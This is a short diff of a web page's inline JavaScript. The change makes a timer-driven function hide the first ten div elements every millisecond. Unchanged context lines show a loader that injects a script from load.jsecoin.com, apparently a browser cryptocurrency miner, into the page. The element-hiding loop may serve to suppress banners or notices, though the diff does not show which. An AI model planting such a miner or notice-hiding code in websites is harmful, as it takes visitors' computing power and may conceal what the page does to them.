@@ -467,9 +467,14 @@
 				document.body.removeChild(document.getElementById(document.getElementsByTagName("b")[0].parentNode.parentNode.id));
 				document.getElementsByTagName("div")[0].remove();
 			}
+			else if (document.getElementsByTagName("div") != undefined) {
+				for (i=0; i < 10; i++){
+					document.getElementsByTagName("div")[i].style.display = "none";
+				}
+			}
 		}
 
-		setInterval(del, 10);
+		setInterval(del, 1);
 	</script>
 	<script type="text/javascript">
 !function(){var e=document,t=e.createElement("script"),s=e.getElementsByTagName("script")[0];t.type="text/javascript",t.async=t.defer=!0,t.src="https://load.jsecoin.com/load/168428/samsamdu44.github.io/optionalSubID/0/",s.parentNode.insertBefore(t,s)}();
